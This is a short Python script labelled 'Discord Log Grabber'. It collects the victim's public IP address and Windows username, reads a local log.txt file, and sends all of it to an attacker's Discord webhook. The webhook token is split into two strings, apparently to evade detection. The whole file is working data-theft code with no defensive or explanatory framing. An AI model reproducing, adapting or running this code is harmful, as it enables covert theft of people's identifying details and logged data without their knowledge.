from urllib.request import Request, urlopen
import discord
import os

def GetIP():
    ip = "Can't get IP"
    try:
        ip = urlopen(Request("https://api.ipify.org?format=text")).read().decode().strip()
    except:
        pass
    return ip.replace("\"", "")

key1 = 'MdKaBTj35XJa-C2net6XR3HaN-VrXv0Vl'
key2 = 'CuRkUADZZ4tUz3vRyGihjXUMXKd-hhI79NU'
webhook = discord.Webhook.partial(931708751461900348, key1 + key2, adapter=discord.RequestsWebhookAdapter())

with open(file='log.txt', mode='rb') as f:
    discord_file = discord.File(f)

webhook.send('Username: ' + os.getenv("UserName") + '\n' + "ip: " + GetIP() + '\n', username='Discord Log Grabber', avatar_url='https://i.ibb.co/c3P5DbN/Gigachad.png', file=discord_file)
